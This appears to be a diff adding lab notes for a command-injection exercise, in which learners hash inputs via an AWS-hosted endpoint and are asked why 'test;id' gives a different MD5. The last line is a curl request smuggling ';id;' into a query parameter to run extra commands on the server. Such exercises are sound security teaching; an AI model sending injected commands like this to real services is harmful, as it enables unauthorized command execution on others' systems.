@@ -1,0 +1,19 @@
+https://gchq.github.io/CyberChef/
+
+lambdacontent-lizardblue.s3-website-us-east-1.amazonaws.com 
+
+input: test -> MD5 -> d8e8fca2dc0f896fd7cb4cb0031ba249
+input: test;id -> MD5 -> e21f27401faa8ca6a35cd7aae279c2bf
+Why are these different hashes?
+
+Try chaining three or more commands together with a ; seperating. What hash do you get now and why?
+
+
+
+curl lambdacontent-lizardblue.s3-website-us-east-1.amazonaws.com
+
+curl https://a8spqqmetd.execute-api.us-east-1.amazonaws.com/prod?inputstring=bbb
+
+echo bbb | md5sum
+
+curl https://a8spqqmetd.execute-api.us-east-1.amazonaws.com/prod?inputstring=aaa%3Bid%3Becho%20bbb
